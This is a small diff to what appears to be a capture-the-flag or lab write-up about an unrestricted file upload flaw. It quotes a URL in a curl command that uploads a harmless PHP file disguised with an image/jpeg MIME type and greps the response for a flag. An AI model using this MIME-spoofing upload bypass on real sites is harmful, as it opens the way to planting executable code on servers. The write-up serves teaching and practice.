@@ -20,7 +20,7 @@ The upload feature at `/index.php?page=upload` allows attackers to upload PHP fi
 ```bash
 echo '<?php echo "hello"; ?>' > test.php
 
-curl http://<IP_ADDRESS>/index.php?page=upload \
+curl "http://<IP_ADDRESS>/index.php?page=upload" \
   -F "Upload=Upload" \
   -F "uploaded=@test.php;type=image/jpeg" \
   -F "MAX_FILE_SIZE=100000" | grep "flag"
